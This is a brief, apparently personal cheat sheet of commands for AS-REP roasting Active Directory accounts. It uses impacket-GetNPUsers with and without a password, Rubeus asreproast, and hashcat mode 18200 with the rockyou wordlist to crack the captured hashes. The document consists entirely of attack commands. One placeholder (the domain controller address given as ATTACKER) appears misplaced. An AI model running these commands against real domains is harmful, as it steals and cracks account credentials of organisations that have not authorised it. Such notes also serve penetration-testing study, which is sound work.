
```
impacket-GetNPUsers -dc-ip TARGET  -request -outputfile hashes.asreproast corp.com/pete
```

without password ->
```
impacket-GetNPUsers corp.com/ -dc-ip ATTACKER -no-pass -usersfile users.txt
```

```
.\Rubeus.exe asreproast /nowrap
```

```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


